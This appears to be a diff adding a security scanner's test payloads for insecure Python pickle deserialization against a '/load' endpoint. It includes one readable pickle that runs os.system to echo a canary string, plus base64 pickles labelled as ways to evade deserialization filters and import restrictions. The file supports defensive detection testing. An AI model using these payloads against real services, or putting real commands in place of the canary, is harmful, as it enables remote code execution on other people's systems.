@@ -1,0 +1,32 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVGQAAAAAAAIwLc3lzLm1vZHVsZXOUjAZzeXN0ZW2UjAZnZXRhdXSUk1KCVQRJREM6VQZzeXN0ZW2UaABLAXRSlFKULg=="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode manipulation to bypass deserialization filter"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "cos\nsystem\n(S'echo CANARY_DESER_9a1f7b'\ntR."
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle protocol 0 (text-based) to evade binary detection"
+  },
+  {
+    "id": "dyn_deser_3",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAIwIYnVpbHRpbnOUjAZnZXRhdXSUk1KCVQRJREM6VQZidWlsdGluc5RoAEsBdFKUUi4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "builtins module reference to bypass import restrictions"
+  }
+]
